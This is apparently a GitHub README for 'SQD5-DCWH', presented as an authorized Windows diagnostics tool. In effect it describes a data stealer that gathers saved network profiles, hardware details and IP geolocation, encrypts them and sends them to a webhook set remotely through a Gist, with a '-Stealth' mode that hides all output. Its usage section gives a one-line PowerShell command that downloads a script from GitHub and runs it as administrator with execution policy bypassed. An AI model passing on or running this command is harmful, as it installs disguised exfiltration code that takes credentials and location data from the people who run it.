# SQD5-DCWH

Device diagnostics and telemetry collection tool for Windows systems.

## Overview

SQD5-DCWH collects system information, network diagnostics, and device configuration data for authorized auditing and inventory purposes. Data is encrypted and transmitted to a configured endpoint.

## Features

- **System Profiling** — CPU, model, OS version, and hardware configuration
- **Network Diagnostics** — Saved network profiles and connectivity data
- **Location Services** — Geolocation via public IP (city, country, ISP)
- **Encrypted Transport** — AES-256-CBC encryption with PBKDF2 key derivation
- **Resilient Delivery** — Automatic retry with configurable attempts
- **Configuration Updates** — Remote endpoint list fetched from version-controlled source
- **Quiet Mode** — `-Stealth` suppresses all console output

## Usage

```powershell
$w="";$env:DCWH_URL=$w;iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/s.ps1' -OutFile "$env:TMP\s.ps1";Start-Process powershell "-NoP -EP Bypass -File `"$env:TMP\s.ps1`"" -Verb RunAs
```

Set `$w` in your PowerShell session before running to specify a custom endpoint URL, or leave it unset to use the remote configuration source.

### Parameters

| Parameter | Description |
|-----------|-------------|
| `-WebhookURL` | Target endpoint URL (overrides all other sources) |
| `-EncryptionPass` | Custom passphrase for AES-256 payload encryption |
| `-Stealth` | Suppress all console output |

### Configuration Priority

1. `-WebhookURL` parameter
2. `$env:DCWH_URL` environment variable
3. Remote configuration source (Gist)

## Files

| File | Purpose |
|------|---------|
| [`s.ps1`](https://github.com/09sychic/sqd5-with-dcwh/blob/main/s.ps1) | Main collection and transmission script |
| [`r.bat`](https://github.com/09sychic/sqd5-with-dcwh/blob/main/r.bat) | Batch launcher for CMD environments |

## Requirements

- Windows 7+
- PowerShell 5.1+
- Administrator privileges

## Notes

This tool is designed for authorized system auditing and diagnostic data collection. Ensure compliance with applicable policies and regulations before use.
